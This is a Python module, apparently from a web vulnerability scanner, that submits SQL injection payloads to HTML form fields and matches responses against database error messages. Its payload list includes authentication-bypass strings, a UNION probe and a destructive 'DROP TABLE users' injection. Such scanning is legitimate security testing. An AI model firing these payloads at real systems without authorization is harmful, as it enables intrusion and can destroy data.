from .utils import send_request
import re

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--"
]

SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-",
    "PostgreSQL",
    "SQLite",
    "Unclosed quotation mark"
]

def test_sqli(url, form_details):
    vulns = []
    for payload in SQLI_PAYLOADS:
        data = {}
        for inp in form_details['inputs']:
            if inp['type'] != 'submit':
                data[inp['name']] = payload
        if form_details['method'] == 'post':
            response = send_request(form_details['url'], method='POST', data=data)
        else:
            response = send_request(form_details['url'], method='GET', data=data)
        if response:
            for error in SQL_ERRORS:
                if re.search(error, response.text, re.IGNORECASE):
                    vulns.append({
                        'payload': payload,
                        'url': form_details['url'],
                        'method': form_details['method'],
                        'parameter': list(data.keys())[0] if data else 'unknown',
                        'evidence': error
                    })
                    break
    return vulns